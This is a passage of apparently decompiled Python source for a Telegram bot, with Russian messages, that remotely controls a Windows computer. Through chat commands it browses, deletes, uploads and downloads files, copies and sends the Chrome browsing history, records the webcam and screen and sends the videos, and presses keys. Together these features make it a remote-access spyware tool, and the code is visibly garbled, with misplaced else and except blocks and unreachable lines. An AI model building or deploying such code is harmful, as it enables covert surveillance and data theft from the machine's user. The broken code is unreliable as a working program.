        await state.set_state(WaitingForInput.waiting_for_new_folder_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_new_folder_path)
async def process_folder_name(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        folder_name = message.text
        if os.path.dirname(folder_name):
            if not os.path.exists(folder_name):
                os.makedirs(folder_name, exist_ok=True)
                await message.answer(f'–ü–∞–ø–∫–∞ \'{folder_name}\' —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!')
                await state.clear()
            else:  # inserted
                await message.answer(f'–ü–∞–ø–∫–∞ —Å –∏–º–µ–Ω–µ–º \'{folder_name}\' —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!')
                await state.clear()
        else:  # inserted
            await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –∞ –Ω–µ —Ç–æ–ª—å–∫–æ –µ—ë –Ω–∞–∑–≤–∞–Ω–∏–µ.')
            await message.answer('–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤ –ø—Ä–æ—Ü–µ—Å—Å.')
            await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '—É–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É')
async def delet_folder_command(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ –≤–∫–æ–Ω—Ü–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø–∞–ø–∫–∏\\, –ø—Ä–∏–º–µ—Ä:*\n \'C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_–ø–∞–ø–∫–∏\'\n*\\!\\!\\!–ü–∞–ø–∫–∞ —É–¥–∞–ª—è–µ—Ç—Å—è —Å–æ –≤—Å–µ–º —Å–æ–¥–µ—Ä–∂–∏–º—ã–º\\!\\!\\!*', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_folder_delete_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
incorrect_attempts = {}

@dp.message(WaitingForInput.waiting_for_folder_delete_path)
async def processdelet_folder_name(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    folder_name_delet = message.text
    if user_id not in incorrect_attempts:
        incorrect_attempts[user_id] = 0
    if message.from_user.id in ALLOWED_USER_ID:
        if os.path.exists(folder_name_delet) and os.path.isdir(folder_name_delet):
            try:
                shutil.rmtree(folder_name_delet)
                await message.answer(f'–ü–∞–ø–∫–∞ \'{folder_name_delet}\' –∏ –≤—Å–µ –µ—ë —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.')
            except Exception as e:
                    await state.set_state(None)
        else:  # inserted
            incorrect_attempts[user_id] += 1
            if incorrect_attempts[user_id] >= 1:
                await message.answer(f'–ü–∞–ø–∫–∞ \'{folder_name_delet}\' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ')
                await message.answer('–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤ –ø—Ä–æ—Ü–µ—Å—Å.')
                await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ø–∞–ø–∫–∏: {e}')
        await state.set_state(None)
        return

@dp.message(F.text.lower() == '—Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª')
async def send_file(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞, –ø—Ä–∏–º–µ—Ä:\n C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ_—Ñ–∞–π–ª–∞.txt')
        await state.set_state(WaitingForInput.waiting_for_download_file_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_download_file_path)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        directory_file = message.text
        try:
            if not os.path.isfile(directory_file):
                await message.answer('–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—É—Ç—å –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.')
        except Exception as e:
                    await state.clear()
            else:  # inserted
                file_size = os.path.getsize(directory_file)
                max_size = 52428800
                if file_size > max_size:
                    await message.answer(f'–§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({file_size / 1048576:.2f} MB). –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞ - 50 MB.')
                        await state.clear()
                else:  # inserted
                    document = FSInputFile(directory_file)
                    await message.answer_document(document)
                        await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}\n')
        await state.clear()
        return None

@dp.message(F.text.lower() == '—É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª')
async def send_file(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ –∏–º—è —Ñ–∞–π–ª–∞ —Å –µ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º\\, –ø—Ä–∏–º–µ—Ä\\:*\n\'C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_—Ñ–∞–π–ª–∞\\.txt\'', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_file_delete_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_delete_path)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        directory_file_delet = message.text
        try:
            if os.path.exists(directory_file_delet):
                os.remove(directory_file_delet)
                await message.answer(f'*–§–∞–π–ª* \'{directory_file_delet}\' *—É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω.*', parse_mode='Markdown')
        except PermissionError:
            else:  # inserted
                await message.answer(f'*–§–∞–π–ª* \'{directory_file_delet}\' *–Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω ‚ùå*\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –ø—É—Ç–∏ –∏ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞, –∑–∞—Ç–µ–º –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.', parse_mode='Markdown')
                else:  # inserted
                    await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'*–û—à–∏–±–∫–∞:* –§–∞–π–ª \'{directory_file_delet}\' *–Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å,* —Ç–∞–∫ –∫–∞–∫ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º ‚ö†Ô∏è', parse_mode='Markdown')
    except Exception as e:
        await message.answer(f'*–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ ‚ùå*\n`{str(e)}`', parse_mode='Markdown')
current_directory = 'C:/'

@dp.message(F.text.lower() == '—Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')
async def show_directory_content(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        try:
            files_and_dirs = os.listdir(current_directory)
            folders = []
            files = []
            for item in files_and_dirs:
                full_path = os.path.join(current_directory, item)
                if os.path.isdir(full_path):
                    folders.append(item)
                else:  # inserted
                    size = os.path.getsize(full_path)
                    files.append(f'{item}  -  {size / 1048576:.2f} MB')
            content = folders + files
            content_text = '\n'.join(content) if content else '–ü–∞–ø–∫–∞ –ø—É—Å—Ç–∞'

            def escape_md(text):
                escape_chars = '_[]()~`>#+-=|{}.!'
                return ''.join((f'\\{char}' if char in escape_chars else char for char in text))
            safe_directory = escape_md(current_directory)
            content_text = escape_md(content_text)
            response = f'*–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏* \'`{safe_directory}`\':\n\n{content_text}'
        except Exception as e:
            pass  # postinserted
        else:  # inserted
            await message.answer(response, parse_mode='MarkdownV2')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        response = f'–û—à–∏–±–∫–∞: {escape_md(str(e))}'

@dp.message(F.text == '–ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å—Å—è –ø–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')
async def change_directory(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:')
    await state.set_state(WaitingForInput.waiting_for_directory_path)

@dp.message(WaitingForInput.waiting_for_directory_path)
async def set_new_directory(message: types.Message, state: FSMContext):
    global current_directory  # inserted
    if message.from_user.id in ALLOWED_USER_ID:
        new_directory = message.text
        if os.path.isdir(new_directory):
            current_directory = new_directory
            await message.answer(f'*–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–º–µ—Å—Ç–∏–ª—Å—è, –≤–æ—Ç —Ç–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è:*\n\'`{current_directory}`\'', parse_mode='MarkdownV2')
        else:  # inserted
            await message.answer('–ù–µ–≤–µ—Ä–Ω—ã–π –ø—É—Ç—å. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤.')
        await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
tasks = {}

@dp.message(F.text.lower() == '–∏—Å—Ç–æ—Ä–∏—è —Ö—Ä–æ–º–∞')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_chrome_history():
            history_path = os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History')
            if not os.path.exists(history_path):
                return (False, '–§–∞–π–ª –∏—Å—Ç–æ—Ä–∏–∏ Chrome –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–æ–∑–º–æ–∂–Ω–æ, –±—Ä–∞—É–∑–µ—Ä Chrome –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.')
            temp_history_path = os.path.join(directory, 'temp_history')
            shutil.copy2(history_path, temp_history_path)
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            query = '\n            SELECT urls.url, urls.title, urls.last_visit_time\n            FROM urls\n            ORDER BY last_visit_time DESC\n            '
            cursor.execute(query)
            rows = cursor.fetchall()
            text_to_save = ''
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]
                try:
                    if last_visit_time > 0:
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:  # inserted
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    pass  # postinserted
                else:  # inserted
                    text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
            else:  # inserted
                file_path = os.path.join(directory, '–ò—Å—Ç–æ—Ä–∏—è_–•—Ä–æ–º–∞.txt')
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(text_to_save)
            conn.close()
            os.remove(temp_history_path)
            return (True, file_path)
                last_visit_time = f'Error: {str(e)}'
            else:  # inserted
                pass
        await message.answer('–ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ Chrome. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...')
        success, result = get_chrome_history()
        if not success:
            await message.answer(result)
            return
        else:  # inserted
            file_path = result
            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_document(document=file_to_send, caption='üìÇ –ò—Å—Ç–æ—Ä–∏—è Chrome')
            except Exception as e:
                pass  # postinserted
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')

@dp.message(F.text == '–ó–∞–ø–∏—Å—å —Å –≤–µ–± –∫–∞–º–µ—Ä—ã')
async def web_record(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    await state.clear()
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
        await state.set_state(WaitingForInput.waiting_for_webcam_recording_duration)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_webcam_recording_duration)
async def start_recording(message: types.Message, state: FSMContext):
    global frames  # inserted
    if message.from_user.id in ALLOWED_USER_ID:
        user_input = message.text

        async def is_number(value):
            try:
                float(value)
                return True
            except ValueError:
                return False
            else:  # inserted
                pass

        async def is_integer(value):
            try:
                int_value = int(value)
                return True
            except ValueError:
                return False
            else:  # inserted
                pass
        if await is_number(user_input):
            if await is_integer(user_input):
                break
            await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.')
            await state.clear()
            return
        else:  # inserted
            await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.')
            await state.clear()
            return
        try:
            reader = imageio.get_reader('<video0>')
            frame = reader.get_next_data()
            if frame is not None:
                pass
            reader._close()
            await state.clear()
        except Exception as e:
            else:  # inserted
                sent_message = await message.answer('–ù–∞—á–∞–ª–æ –∑–∞–ø–∏—Å–∏...')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer('–ö–∞–º–µ—Ä–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –∑–∞–Ω—è—Ç–∞ –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.')
        await state.clear()
            """–§—É–Ω–∫—Ü–∏—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ"""  # inserted
            writer = imageio.get_writer(VIDEO_FILENAME, fps=FPS)
            reader = imageio.get_reader('<video0>')
            frame_shape = reader.get_meta_data()['size']
            width, height = frame_shape
            for _ in range(DURATION * FPS):
                try:
                    frame = reader.get_next_data()
                    frame = np.array(frame)
                    frame_rgb = np.array(frame)
                    writer.append_data(frame_rgb)
                except StopIteration:
                    pass  # postinserted
                writer.close()
                return True
                break
            else:  # inserted
                pass

@dp.message(F.text == '–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞')
async def web_record(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    await state.clear()
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
        await state.set_state(WaitingForInput.waiting_for_screen_recording_duration)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_screen_recording_duration)
async def start_recording(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        filename = os.path.join(directory, 'record.mp4')
        user_input = message.text

        async def is_number(value):
            try:
                float(value)
                await state.clear()
            except ValueError:
                    return True
                    await state.clear()
                    return False

        async def is_integer(value):
            try:
                int(value)
                await state.clear()
            except ValueError:
                    return True
                    await state.clear()
                    return False
        if not (await is_number(user_input) and await is_integer(user_input)):
            await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.')
            await state.clear()
            return
            else:  # inserted
                duration = int(user_input)
                sent_message = await message.answer('–ù–∞—á–∞–ª–æ –∑–∞–ø–∏—Å–∏...')

                def record_screen_sync(filename, duration):
                    """–°–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞"""  # inserted
                    try:
                        screen_size = pyautogui.size()
                        writer = imageio.get_writer(filename, fps=20)
                        start_time = time.time()
                        while time.time() - start_time < duration:
                            img = pyautogui.screenshot()
                            frame = np.array(img)
                            writer.append_data(frame)
                        writer.close()
                        return filename
                    except Exception as e:
                        print(f'Error recording screen: {e}')
                        return None
                    else:  # inserted
                        pass

                async def record_screen(filename, duration):
                    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–æ—Ç–æ–∫–æ–≤"""  # inserted
                    loop = asyncio.get_event_loop()
                    with ThreadPoolExecutor() as executor:
                        return await loop.run_in_executor(executor, record_screen_sync, filename, duration)
                recorded_filename = await record_screen(filename, duration)
                if recorded_filename:
                    await message.bot.edit_message_text('–ó–∞–ø–∏—Å—å –∑–∞–≤–µ—Ä—à–µ–Ω–∞. \n–û—Ç–ø—Ä–∞–≤–ª—è—é –∑–∞–ø–∏—Å—å...', chat_id=message.chat.id, message_id=sent_message.message_id)
                    file_to_send = FSInputFile(recorded_filename)
                    await message.answer_video(file_to_send, caption='–í–æ—Ç –∑–∞–ø–∏—Å—å —Å —ç–∫—Ä–∞–Ω–∞!')
                    os.remove(recorded_filename)
                else:  # inserted
                    await message.answer('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞.')
                    try:
                        os.remove(recorded_filename)
                    except:
                        pass
            else:  # inserted
                await state.clear()

@dp.message(F.text.lower() == 'alt + f4')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        pyautogui.hotkey('alt', 'f4')
        await message.answer('–û–∫–Ω–æ –±—ã–ª–æ —É—Å–ø–µ—à–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ‚úÖ')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '—Å–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ –æ–∫–Ω–∞')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        KEYEVENTF_KEYDOWN = 0
        KEYEVENTF_KEYUP = 2
        VK_LWIN = 91
        VK_D = 68
        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYDOWN, 0)
        ctypes.windll.user32.keybd_event(VK_D, 0, KEYEVENTF_KEYDOWN, 0)
        time.sleep(0.1)
        ctypes.windll.user32.keybd_event(VK_D, 0, KEYEVENTF_KEYUP, 0)
        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
        await message.answer('–û–∫–Ω–∞ –±—ã–ª–∏ —É—Å–ø–µ—à–Ω–æ —Å–≤—ë—Ä–Ω—É—Ç—ã‚úÖ')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª')
async def cmd_start(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ –∏–º—è —Ñ–∞–π–ª–∞ —Å –µ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º\\, –ø—Ä–∏–º–µ—Ä\\:*\n\'C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_—Ñ–∞–π–ª–∞\\.txt\'', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_file_open_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_open_path)
async def web_record_send(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        directoryopn = message.text
        if os.path.isfile(directoryopn):
            try:
                os.system(f'start \"\" \"{directoryopn}\"')
                await message.answer('*–§–∞–π–ª –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç ‚úÖ\\.*', parse_mode='MarkdownV2')
            except Exception as e:
                pass  # postinserted
        else:  # inserted
            await message.answer(f'*–§–∞–π–ª* \'{directoryopn}\' *–Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω ‚ùå* \n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –ø—É—Ç–∏ –∏ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞\\, –∑–∞—Ç–µ–º –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É\\.', parse_mode='MarkdownV2')
        await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Ñ–∞–π–ª–∞: {e}')

@dp.message(F.text.lower() == '–∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª')
async def handle_text_message(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.text.lower() == '–∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª':
        if message.from_user.id in ALLOWED_USER_ID:
            await message.answer('–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª, –ø—Ä–∏–º–µ—Ä:\n C:/Users/Public')
            await state.set_state(WaitingForInput.waiting_for_file_upload_destination_path)
        else:  # inserted
            await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_upload_destination_path)
async def set_new_directory(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        directoryForSaveFiles = message.text
        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
            await message.answer('–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤ –ø—Ä–æ—Ü–µ—Å—Å.')
            await state.clear()
            return
        else:  # inserted
            await state.update_data(directoryForSaveFiles=directoryForSaveFiles, attempts=0)
            await message.answer(f'–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ —ç—Ç–æ–º—É –ø—É—Ç–∏:\n{directoryForSaveFiles}')
            await state.set_state(WaitingForInput.waiting_for_file_upload)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_upload, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def handle_document(message: types.Message, state: FSMContext):
